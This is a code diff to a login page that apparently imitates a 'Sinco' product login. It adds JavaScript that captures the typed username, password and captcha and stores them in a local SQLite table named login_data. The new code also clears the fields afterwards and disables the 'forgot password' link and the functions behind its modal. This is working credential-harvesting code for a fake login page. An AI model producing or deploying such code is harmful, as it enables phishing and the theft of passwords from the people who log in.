@@ -139,59 +139,94 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Capturar datos del formulario de login
-    const btnSiguiente = document.getElementById('btnSiguiente');
-    if (btnSiguiente) {
-        btnSiguiente.addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            // Capturar los datos del formulario
-            const usuario = document.getElementById('txtUsuario').value;
-            const contrasena = document.getElementById('txtContrasena').value;
-            const captcha = document.getElementById('txtCaptcha').value;
-            
-            // Validar campos obligatorios
-            if (!usuario || !contrasena) {
-                alert('Por favor, complete usuario y contraseña');
-                return;
+   // Capturar datos del formulario de login
+const btnSiguiente = document.getElementById('btnSiguiente');
+if (btnSiguiente) {
+    btnSiguiente.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // Capturar los datos del formulario
+        const usuario = document.getElementById('txtUsuario').value;
+        const contrasena = document.getElementById('txtContrasena').value;
+        const captcha = document.getElementById('txtCaptcha') ? document.getElementById('txtCaptcha').value : '';
+        
+        // Validar campos obligatorios
+        if (!usuario || !contrasena) {
+            alert('Por favor, complete usuario y contraseña');
+            return;
+        }
+        
+        // Guardar en base de datos SQLite
+        guardarEnBaseDeDatos(usuario, contrasena, captcha);
+        
+        // Limpiar campos después de capturar
+        document.getElementById('txtUsuario').value = '';
+        document.getElementById('txtContrasena').value = '';
+        if (document.getElementById('txtCaptcha')) {
+            document.getElementById('txtCaptcha').value = '';
+        }
+    });
+}
+
+// Función para guardar en base de datos SQLite
+function guardarEnBaseDeDatos(usuario, contrasena, captcha) {
+    // Crear o abrir la base de datos
+    const db = window.sqlitePlugin.openDatabase({
+        name: 'ejemplo.db',
+        location: 'default'
+    });
+    
+    // Crear tabla si no existe
+    db.transaction(function(tx) {
+        tx.executeSql(
+            'CREATE TABLE IF NOT EXISTS login_data (id INTEGER PRIMARY KEY AUTOINCREMENT, usuario TEXT, contrasena TEXT, captcha TEXT, fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP)',
+            [],
+            function(tx, result) {
+                console.log('Tabla creada o ya existe');
+            },
+            function(tx, error) {
+                console.log('Error creando tabla: ' + error.message);
             }
-            
-            // Mostrar datos capturados
-            console.log('=== DATOS DE LOGIN CAPTURADOS ===');
-            console.log('Usuario:', usuario);
-            console.log('Contraseña:', contrasena);
-            console.log('Captcha:', captcha);
-            
-            alert('Datos capturados correctamente. Revise la consola (F12)');
-        });
-    }
-});
+        );
+    });
+    
+    // Insertar datos
+    db.transaction(function(tx) {
+        tx.executeSql(
+            'INSERT INTO login_data (usuario, contrasena, captcha) VALUES (?, ?, ?)',
+            [usuario, contrasena, captcha],
+            function(tx, result) {
+                console.log('Datos guardados correctamente en la base de datos');
+                console.log('ID del registro:', result.insertId);
+            },
+            function(tx, error) {
+                console.log('Error guardando datos: ' + error.message);
+            }
+        );
+    });
+}
 
 // Sobrescribir cualquier función que pueda estar abriendo el modal
 window.mostrarRecordarClave = function() { return false; };
 window.abrirRecordarClave = function() { return false; };
-</script>
 
-</body>
-</html>
-
-<script src="Scripts/Sinco/modules/login.js?v=638954490889885596"></script>
-<script src="Scripts/Sinco/modules/login.fonts.js?v=638954490889885596"></script>
-
-<script>
-// Prevenir que aparezca el modal de Recordar Clave
+// Deshabilitar completamente "Olvidé mi clave"
 document.addEventListener('DOMContentLoaded', function() {
     const recordarClave = document.getElementById('recordarClave');
     if (recordarClave) {
         recordarClave.addEventListener('click', function(e) {
             e.preventDefault();
-            // No aparece nada, no se abre ningún modal
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
         });
+        
+        // También eliminar cualquier evento existente
+        recordarClave.onclick = null;
+        recordarClave.href = "javascript:void(0)";
     }
 });
 </script>
-
 </body>
-
-
-</body></html>
+</html>
